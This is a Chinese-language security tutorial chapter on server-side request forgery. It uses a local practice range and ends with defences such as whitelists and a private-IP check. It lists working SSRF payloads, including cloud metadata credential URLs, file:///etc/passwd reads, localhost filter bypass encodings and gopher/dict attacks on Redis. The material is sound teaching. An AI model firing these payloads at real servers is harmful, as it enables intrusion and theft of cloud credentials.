# 9. SSRF 服务器端请求伪造

## 是什么？

Server-Side Request Forgery — 攻击者诱导服务器向任意 URL 发起请求，从而访问内网资源、云元数据、甚至执行本地命令。

## 🧠 原理

```
正常功能：用户输入 URL，服务器去获取并返回内容
例如：图片代理、网页预览、Webhook 测试

攻击者输入：http://127.0.0.1:8080/admin
服务器去请求内网的管理后台 → 返回内网数据！
```

## 🎯 靶场练习 10：SSRF

打开 `http://127.0.0.1:5000/ssrf/fetch`

### 基础练习

```
1. 正常使用：http://example.com
2. 访问本服务：http://127.0.0.1:5000/
3. 访问内网 8080：http://127.0.0.1:8080/
4. 访问内网 3306（MySQL）：http://127.0.0.1:3306/
```

## 💀 SSRF 能做什么

### 1. 探测内网

```
http://10.0.0.1/
http://10.0.0.2/
http://172.16.0.1/
http://192.168.1.1/
http://192.168.1.1:22/       ← SSH
http://192.168.1.1:3306/     ← MySQL
http://192.168.1.1:6379/     ← Redis（Redis SSRF 打穿案例很多！）
http://192.168.1.1:9200/     ← Elasticsearch
```

### 2. 云元数据

```
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 阿里云
http://100.100.100.200/latest/meta-data/

# Google Cloud
http://metadata.google.internal/computeMetadata/v1/

# 腾讯云
http://metadata.tencentyun.com/latest/meta-data/
```

### 3. 读取本地文件

```php
// 如果底层使用 libcurl 且支持 file 协议
file:///etc/passwd
file:///C:/Windows/win.ini
```

### 4. 端口扫描

通过响应时间/内容差异，判断内网哪些端口开放。

## 🧪 绕过 SSRF 防护

### 绕过 IP 检查

```
黑名单检查 127.0.0.1 → 尝试：
- http://0.0.0.0/           (等价于 127.0.0.1)
- http://0/                 (部分解析器)
- http://127.1/             (省略中间0)
- http://[::1]/             (IPv6 localhost)
- http://2130706433/        (127.0.0.1 的整数形式)
- http://0x7f000001/        (十六进制)
- http://127.0.0.1.nip.io/  (解析到 127.0.0.1 的域名)
```

### 绕过协议限制

```
如果只允许 http/https，试试：
- gopher://127.0.0.1:6379/_*1%0d%0a...  （Gopher 协议打 Redis）
- dict://127.0.0.1:6379/info             （Dict 协议侦查）
```

### 302 跳转绕过

攻击者搭建一个服务器，收到请求后 302 重定向到 `http://127.0.0.1/admin`。

## 🛡️ 防御方法

### ✅ 1. URL 白名单

```php
$ALLOWED_DOMAINS = ['api.example.com', 'cdn.example.com'];
```

### ✅ 2. 禁止内网 IP

```php
$ip = gethostbyname($hostname);
// 检查是否为内网 IP（RFC 1918）
$private_ranges = [
    ['10.0.0.0', '10.255.255.255'],
    ['172.16.0.0', '172.31.255.255'],
    ['192.168.0.0', '192.168.255.255'],
    ['127.0.0.0', '127.255.255.255'],
];
foreach ($private_ranges as $range) {
    if (ip2long($ip) >= ip2long($range[0]) && ip2long($ip) <= ip2long($range[1])) {
        throw new Exception("禁止访问内网地址");
    }
}
```

### ✅ 3. DNS 重绑定检测

解析域名一次后，后续请求应验证解析结果未改变。

### ✅ 4. 限制协议

只允许 `http://` 和 `https://`。

### ✅ 5. 最小权限

代理服务放在独立容器中，无内网访问权限。

---

## 📝 练习

1. 在靶场用 `http://127.0.0.1:5000/` 访问服务本身
2. 尝试探测你本地其他端口
3. 思考：如果靶场部署在云服务器上，SSRF 能造成什么危害？

---

**下一步**：[信息收集与工具使用](10-tools.md)
